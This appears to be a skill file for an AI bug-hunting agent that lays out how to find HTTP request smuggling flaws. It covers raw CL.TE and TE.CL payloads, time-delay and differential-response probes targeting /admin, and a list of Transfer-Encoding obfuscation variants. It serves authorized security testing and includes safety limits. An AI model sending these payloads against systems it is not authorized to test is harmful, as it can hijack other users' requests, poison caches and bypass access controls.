---
name: hunt-smuggling
description: Hunting skill for HTTP Request Smuggling — CL.TE, TE.CL, H2.CL, H2.TE, header obfuscation, and differential response analysis. Use when the target sits behind a reverse proxy or CDN and front-end/back-end disagreement on request boundaries could be induced.
---

# HTTP Request Smuggling Hunting Methodology

HTTP request smuggling abuses disagreement between front-end and back-end servers about where one HTTP request ends and the next begins. It can bypass WAFs, poison caches, hijack requests, and reach internal endpoints.

## When to invoke

- Target behind a CDN, load balancer, or reverse proxy (Cloudflare, Fastly, Akamai, AWS ALB, nginx, haproxy).
- HTTP/2 is accepted or downgraded to HTTP/1.1.
- Multiple backend technologies are suspected (e.g., nginx + Apache, IIS + .NET).
- WAF blocks a direct request but might be bypassed via smuggling.

## Core variants

### CL.TE

Front-end uses `Content-Length`, back-end uses `Transfer-Encoding: chunked`.

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

If the back-end treats `0\r\n\r\n` as end-of-chunks and the `G` as the start of the next request, the next request on the connection is poisoned.

### TE.CL

Front-end uses `Transfer-Encoding`, back-end uses `Content-Length`.

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST /admin HTTP/1.1
Host: target.com

0

```

Back-end reads only 4 bytes (`5c\r\nG`) and treats the rest as a new request.

### H2.CL

HTTP/2 front-end downgrades to HTTP/1.1 back-end. HTTP/2 has no chunked encoding, but a smuggled `Content-Length` header reaches the HTTP/1.1 backend.

### H2.TE

HTTP/2 front-end forwards a `Transfer-Encoding: chunked` pseudo-header to an HTTP/1.1 back-end that honors it.

## Detection technique: time-delay

Send a smuggled request whose body contains a request that sleeps:

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

GET /sleep HTTP/1.1
Host: target.com

```

If the next normal request to the server takes ~30 seconds, smuggling works (the back-end is processing the smuggled `GET /sleep`).

## Detection technique: differential response

Smuggle a request to an endpoint that returns a known response:

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com

```

Then send a normal `GET /` on the same connection. If the response is the `/admin` response, smuggling is confirmed.

## Header obfuscation

If `Transfer-Encoding: chunked` is rejected, try variants the front-end might mishandle:

```text
Transfer-Encoding: chunked
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked, identity
Transfer-Encoding: identity, chunked
Transfer-Encoding: CHUNKED
Transfer-Encoding:\tchunked
Transfer-Encoding: chunked\r\nx: y
[space]Transfer-Encoding: chunked
Transfer-Encoding: chun\nked
```

Some front-ends normalize these to "chunked" while backends do not.

## HTTP/2 specific

1. **H2.CL**: inject a `content-length` header into an HTTP/2 request. The HTTP/2 spec forbids this in some contexts; a naive front-end may forward it.
2. **H2.TE**: inject a `transfer-encoding: chunked` pseudo-header.
3. **Response queue desync**: smuggle a complete request and observe the response queue shift.

## Tooling

If a smuggling tool (e.g., `smuggler.py`, Burp HTTP Request Smuggler) is available, use it. Otherwise craft requests manually and observe timing/response.

Always test on a fresh connection; smuggling by definition depends on connection state. Use HTTP/1.1 keep-alive or HTTP/2 single connection.

## Depth floor

For each target endpoint or front-end/back-end pair, try at least **25 distinct smuggling payloads** covering CL.TE, TE.CL, H2.CL, H2.TE, and header obfuscation variants. Record negative results as `record_fact`.

## Evidence gate

Before `report_finding`:
- Show the crafted smuggling request and the smuggled request.
- Show the differential response or timing proof.
- If possible, demonstrate impact: WAF bypass, cache poisoning, or internal endpoint access.
- Tag `vulnclass: HTTP request smuggling` and bind `traffic_refs`.

## Safety

Smuggling can desynchronize connections and affect other users. Test on:
- Dedicated test instances.
- Staging environments.
- Single-user accounts when possible.

If impact on production is possible, record an `inferred` fact and ask for approval.

## Stop-authority

This skill decides *what smuggling variants to try* and *how to verify*. It never decides when the smuggling class is exhausted — that stays with `hunting-methodology`.
